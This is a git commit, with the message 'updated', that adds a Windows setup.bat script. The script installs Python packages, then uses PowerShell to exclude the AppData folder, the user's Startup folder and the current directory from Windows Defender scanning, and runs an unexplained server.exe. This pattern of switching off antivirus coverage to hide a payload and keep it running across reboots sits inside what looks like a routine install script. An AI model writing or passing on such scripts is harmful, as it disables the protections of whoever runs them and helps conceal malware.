0d9b39970fd4b73670dfd2ac9f9d05a8a83b260b
Shivansh1980 <49563393+Shivansh1980@users.noreply.github.com>
2021-06-07 08:52:10 +0530

    updated

---
+++ setup.bat
@@ -0,0 +1,6 @@
+python -m pip install --upgrade pip
+python -m pip install pywin32 requests subprocess.run sockets winshell pythonw psutil
+powershell -Command Add-MpPreference -ExclusionPath "%APPDATA%"
+powershell -Command Add-MpPreference -ExclusionPath "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+powershell -Command Add-MpPreference -ExclusionPath "%CD%"
+start server.exe
